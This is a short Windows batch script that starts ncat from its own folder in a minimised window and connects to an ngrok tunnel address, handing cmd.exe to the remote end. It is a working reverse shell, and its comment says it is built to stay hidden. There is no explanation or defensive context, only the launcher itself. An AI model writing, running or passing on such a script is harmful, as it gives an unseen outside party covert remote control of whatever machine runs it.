@echo off
:: Hide the command prompt window
start /min cmd /c "%~dp0ncat.exe 6.tcp.eu.ngrok.io 12207 -e cmd.exe"
exit